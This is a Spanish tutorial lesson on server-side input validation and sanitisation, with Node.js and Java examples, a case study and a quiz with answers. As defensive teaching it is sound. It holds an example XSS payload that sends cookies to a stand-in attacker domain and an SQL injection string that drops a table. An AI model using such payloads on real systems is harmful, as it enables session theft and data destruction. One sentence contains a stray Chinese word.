## La idea en una frase

> El frontend es una experiencia de usuario. El backend es la línea
> de defensa. Si solo validas en el navegador, no estás validando.

## Por qué la validación del frontend no basta

La validación en el navegador (HTML5, JavaScript, React) sirve para
**mejorar la experiencia**: avisa al usuario antes de enviar, muestra
errores bonitos, evita esperas innecesarias.

Pero **no protege los datos**. Un usuario malicioso (o un compañero
curioso) puede:

- Desactivar JavaScript y enviar datos directamente
- Modificar las validaciones con el inspector
- Hacer peticiones HTTP con herramientas como Postman o curl
- Interceptar y modificar la respuesta antes de que llegue al servidor

Si tu backend confía en que los datos son correctos porque "el frontend
los validó", estás dejando la puerta abierta.

## Qué validar en el servidor

### 1. Tipos de dato

Si esperas un número, comprueba que sea número. Si esperas un email,
comprueba que sea email.

```javascript
// ❌ MAL — Asumir que el tipo es correcto
const id = req.body.id;
const usuario = await db.findById(id);

// ✅ BIEN — Validar el tipo
if (typeof req.body.id !== 'number' || req.body.id < 1) {
  return res.status(400).json({ error: 'ID inválido' });
}
```

### 2. Longitud

Nunca confíes en que un campo tiene un tamaño razonable. Un atacante
puede enviar un string de millones de caracteres.

```javascript
// ❌ MAL
const nombre = req.body.nombre; // Podría tener 10 millones de caracteres

// ✅ BIEN
if (!req.body.nombre || req.body.nombre.length > 100) {
  return res.status(400).json({ error: 'Nombre requerido (máx. 100 caracteres)' });
}
```

### 3. Formato

Emails, teléfonos, fechas... cada campo tiene un formato esperado.

```javascript
// Validación de email básica
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRegex.test(req.body.email)) {
  return res.status(400).json({ error: 'Email inválido' });
}
```

### 4. Rangos

Si esperas un número entre 1 y 100, no aceptes 0 ni 999.

```javascript
const edad = parseInt(req.body.edad);
if (isNaN(edad) || edad < 0 || edad > 150) {
  return res.status(400).json({ error: 'Edad inválida' });
}
```

### 5. Valores permitidos

Si solo hay 3 opciones posibles, no aceptes la cuarta.

```javascript
const roles = ['admin', 'usuario', 'editor'];
if (!roles.includes(req.body.rol)) {
  return res.status(400).json({ error: 'Rol no permitido' });
}
```

## Herramientas de validación

No tienes que escribir toda la validación a mano. Existen librerías
que hacen el trabajo pesado:

### Joi (Node.js)

```javascript
const Joi = require('joi');

const schema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(8).max(100).required(),
  nombre: Joi.string().min(1).max(100).required(),
  edad: Joi.number().integer().min(0).max(150)
});

const { error } = schema.validate(req.body);
if (error) {
  return res.status(400).json({ error: error.details[0].message });
}
```

### express-validator (Node.js)

```javascript
const { body, validationResult } = require('express-validator');

app.post('/api/usuarios',
  body('email').isEmail().normalizeEmail(),
  body('password').isLength({ min: 8 }),
  body('nombre').trim().escape(),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // Datos validados, continuar
  }
);
```

### Jakarta Bean Validation (Java)

```java
public class UsuarioDTO {
    @NotNull @Email
    private String email;

    @Size(min = 8, max = 100)
    private String password;

    @NotBlank @Size(max = 100)
    private String nombre;
}
```

## Sanitización: más allá de la validación

La validación comprueba que los datos sean correctos. La **sanitización**
limpia los datos para eliminar peligros potenciales.

### Qué sanitizar

- **Espacios extra**: `"  Juan  "` → `"Juan"`
- **Caracteres especiales**: eliminar `<script>` de textos
- **Emails**: normalizar a minúsculas
- **Números**: convertir strings a números cuando se espere un número

```javascript
// Sanitización básica
const nombre = req.body.nombre.trim().substring(0, 100);
const email = req.body.email.toLowerCase().trim();
const edad = parseInt(req.body.edad) || 0;
```

### XSS y sanitización

Si tu app muestra datos del usuario en la web (comentarios, nombres,
búsquedas), un atacante puede insertar código HTML o JavaScript:

```html
<!-- Un usuario escribe esto en un comentario -->
&lt;script&gt;document.location='https://atacante.com/robar?cookie='+document.cookie&lt;/script&gt;
```

Si lo muestras sin sanitizar, el script se ejecuta en el navegador
de quien vea el comentario. Por eso necesitas sanitizar **entrada**
(validar) y **salida** (escapar HTML).

## Caso práctico

<CasoPractico titulo="El formulario que aceptaba SQL en el nombre">

  Un equipo tenía un formulario de registro con tres campos: nombre,
  email y contraseña. En el frontend, validaban que el nombre tuviera
  entre 2 y 50 caracteres. El backend no validaba nada:接收ía lo que
  llegara y lo guardaba.

  Un compañero escribió en el campo nombre:

  ```
  Juan'; DROP TABLE usuarios; --
  ```

  El frontend lo rechazó (tenía caracteres peligrosos). Pero el
  compañero abrió el inspector, eliminó la validación JavaScript,
  y envió la petición directamente.

  El backend recibió el dato, lo concatenó en la consulta SQL, y
  ejecutó el borrado de la tabla.

  Si el hubieran validado en el servidor (rechazar caracteres
  especiales en el nombre), el ataque habría fallado.

  **Lección**: la validación del frontend es para UX, no para seguridad.
  Siempre valida en el servidor.

</CasoPractico>

<Aclaracion pregunta="¿Y si uso un ORM como Sequelize o Prisma?">
  Los ORM ofrecen protección parcial. Muchos validan tipos de datos
  automáticamente. Pero no cubren todo:

  - No validan rangos ni longitudes a menos que lo configures
  - No sanitizan strings para XSS
  - No rechazan valores inesperados si no defines un esquema estricto

  Usa el ORM como primera línea, pero añade validación explícita
  para datos críticos (autenticación, pagos, datos sensibles).
</Aclaracion>

## Mini-chequeo

**Pregunta 1.** ¿Por qué no basta con validar en el navegador?
A) Porque es lento · B) Porque un usuario puede desactivar JavaScript
o enviar peticiones directamente · C) Porque HTML5 no valida bien

**Pregunta 2.** ¿Qué es la sanitización?
A) Borrar datos de la base de datos · B) Limpiar datos de entrada
para eliminar peligros · C) Validar que un email sea correcto

<details>
<summary>...Respuestas...</summary>

1. **B**. El navegador es control del usuario. Puede desactivar
   JavaScript, modificar el HTML, o enviar peticiones directamente
   con herramientas externas.
2. **B**. La sanitización limpia los datos: elimina espacios, caracteres
   peligrosos, normaliza formatos. No es lo mismo que validación.

</details>

## Resumen en 3 frases

1. El frontend valida para UX, el backend valida para seguridad.
   Nunca confíes solo en el navegador.
2. Valida tipos, longitudes, formatos, rangos y valores permitidos
   en cada campo de entrada.
3. Usa librerías de validación (Joi, express-validator, Bean Validation)
   en vez de escribir toda la lógica a mano.
